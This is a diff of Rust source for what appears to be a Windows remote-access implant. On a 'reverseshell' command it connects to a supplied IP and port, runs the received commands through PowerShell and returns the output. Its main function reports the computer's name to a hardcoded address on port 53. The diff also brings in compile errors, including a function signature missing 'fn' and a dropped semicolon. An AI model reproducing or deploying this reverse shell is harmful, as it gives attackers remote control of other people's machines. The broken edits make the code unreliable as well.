@@ -10,7 +10,7 @@ use tokio::net::tcp::OwnedWriteHalf;
 use tokio::net::TcpStream;
 use std::io::Result;
 use std::io::prelude::*;
-use std::net::TcpStream as OtherTcpStream;
+use std::net::TcpStream;
 use std::process::Command;
 use std::str::from_utf8;
 use std::env;
@@ -60,11 +60,14 @@ pub fn interpret_payload(payload: String) {
     if infos_payload[0] == "reverseshell"{
         println!("Activating reverseshell");
         shell(infos_payload[1], infos_payload[2]);
+        
     }
 }
 
-pub fn shell(ip: &str, port: &str) -> Result<()> {
-    let mut stream = OtherTcpStream::connect(format!("{}:{}", ip, port))?;
+pub shell(ip: &str, port: &str) -> Result<()> {
+    let args: Vec<String> = env::args().collect();
+    
+    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;
     stream.write(b"Welcome to rustshell.\nI am here to execute your commands\nuse 'exit' to exit\n")?;
     let mut buffer = [0; 2048];
 
@@ -80,7 +83,7 @@ pub fn shell(ip: &str, port: &str) -> Result<()> {
         let output = Command::new("powershell")
                 .args(&[&command])
                 .output()
-                .expect("failed to execute the process");
+                .expect("failed to execute the process")
 
         let reply = output.stdout;
         stream.write(&reply).unwrap();
@@ -100,8 +103,6 @@ async fn main() -> io::Result<()> {
     // Username input
     let key = "COMPUTERNAME";
     let username = env::var(key).unwrap();
-    //Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress
-    //$yourmom = Get-WinSystemLocale; echo $yourmom.Name
 
     // TCP Stream creation
     let mut _stream = TcpStream::connect("192.168.1.41:53").await?;
